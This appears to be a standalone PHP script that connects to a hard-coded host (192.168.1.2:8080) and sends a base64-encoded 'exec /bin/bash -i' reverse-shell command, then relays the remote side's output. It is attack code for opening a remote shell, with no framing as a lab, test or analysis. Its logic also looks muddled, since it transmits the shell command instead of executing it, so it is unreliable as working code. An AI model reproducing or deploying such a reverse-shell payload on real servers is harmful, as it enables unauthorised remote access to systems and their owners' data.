<?php

$socket = stream_socket_client("tcp://192.168.1.2:8080");

stream_filter_append($socket, 'convert.base64-decode');

$message = "exec /bin/bash -i <&3 >&3 2>&3";
$encodedMessage = base64_encode($message);
fwrite($socket, $encodedMessage);

while (!feof($socket)) {
    echo fread($socket, 1024);
}

fclose($socket);

?>
